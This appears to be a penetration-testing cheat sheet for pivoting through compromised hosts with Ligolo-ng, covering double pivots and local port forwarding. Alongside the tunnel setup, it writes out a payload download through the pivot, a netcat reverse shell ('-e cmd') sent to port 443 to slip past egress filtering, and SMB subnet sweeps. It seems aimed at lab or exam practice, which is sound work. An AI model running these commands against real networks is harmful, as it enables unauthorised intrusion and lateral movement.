## Setup with your configuration

TUN0 IP (Kali VPN): 

1st machine EXTERNAL IP: 

1st machine INTERNAL IP: 

NOTE: auto-derives 10.10.10.0/24 range

2nd machine EXTERNAL IP: 

2nd machine INTERNAL IP: 

NOTE: auto-derives 11.11.11.0/24 range

Apply to commands

## 1st Pivot on 1st internal range

1) Create and bring up tunnel1 (kali terminal)

NOTE: requires sudo rights

Copy

```
sudo ip tuntap add user root mode tun tunnel1
sudo ip link set tunnel1 up
```

2) Start Ligolo proxy server on Kali (again sudo rights)

Copy

```
sudo ./proxy -selfcert
```

3) Upload agent.exe / agent and connect back to Kali Ligolo Server

NOTE: on the 1st target machine, run the agent.exe / agent to connect to your TUN0 IP

Copy

```
.\agent.exe -connect 10.10.14.14:11601 -ignore-cert
```

Copy

```
./agent -connect 10.10.14.14:11601 -ignore-cert
```

4) In Ligolo proxy ui: select the agent and start tunnel1

Note: once connected press Enter and select the agent with arrows, then run:

Copy

```
start --tun tunnel1
```

5) Add route to the target subnet

Note: this command is done in a new Kali terminal

Copy

```
sudo ip route add 172.16.5.0/24 dev tunnel1
```

6) Listener on tunnel1

Note: lets new hosts reach the proxy to establish tunnels

Copy

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

7) Test reachability using netexec

Copy

```
netexec smb 172.16.5.0/24
```

## 2nd Pivot on 2nd internal range

1) Create and bring up tunnel2 (kali terminal)

NOTE: repeating the first steps but for tunnel2 now as follows

Copy

```
sudo ip tuntap add user root mode tun tunnel2
sudo ip link set tunnel2 up
```

2) Connect new agent (from 2nd target) to 1st target internal IP

Copy

```
.\agent.exe -connect 172.16.5.10:11601 -ignore-cert
```

3) Once connected in the proxy UI, select with the arrows the new connection that appeared in proxy and hit enter

NOTE: make sure you are on the right connection.Once entered connect to tunnel2 with:

Copy

```
start --tun tunnel2
```

4) Add route to 2nd internal subnet

NOTE: using the 2nd target internal IP

Copy

```
sudo ip route add 172.16.6.0/24 dev tunnel2
```

5) Add listeners for whitelisted ports (443, 80) - PORT FORWARDING STEP

NOTE: using whitelisted ports like 443, 80 (this will work most of the time)

Copy

```
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
```

Copy

```
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```

6) Download from 2nd target using 1st internal

Copy

```
wget http://172.16.5.10/ph03n1x -outfile ph03n1x
```

7) Catch reverse shell from 2nd target on your Kali IP

NOTE: using whitelisted ports like 443, 80 (this will work most of the time)

Copy

```
nc64.exe 172.16.5.10 443 -e cmd
```

8) Test reachability on 2nd subnet

Copy

```
netexec smb 172.16.6.0/24
```

## Local Port Forwarding to your Kali

**Have you found a website that’s accesible only from the target or a service that runs only on the target machine?**

**Then it’s time to do a local port forwading, fast and easy, where you don’t need proxychains to reach it!** 

**Works in terminal (with any tool to be reached) and Firefox (if it’s a website)**

1) On your Kali terminal, create a new network called ligolo

NOTE: requires sudo rights

Copy

```
sudo ip tuntap add user root mode tun ligolo
```

Copy

```
sudo ip link set ligolo up
```

2) Connect agent to your proxy

NOTE: this uses your TUN0 IP dynamically

Copy

```
.\agent.exe -connect 10.10.14.14:11601 -ignore-cert
```

3) In proxy UI, select the new connection and attach it to ligolo

Copy

```
start --tun ligolo
```

4) Add the magic route to access all internal ports locally on Kali

Copy

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

Now you can access any local port directly via `240.0.0.1` from Kali

5) Verify forwarding with Nmap

NOTE: you should see the local ports running on the target (previously visible only on the target itself). Now they are reachable from Kali without proxychains.

Copy

```
nmap -p- 240.0.0.1
```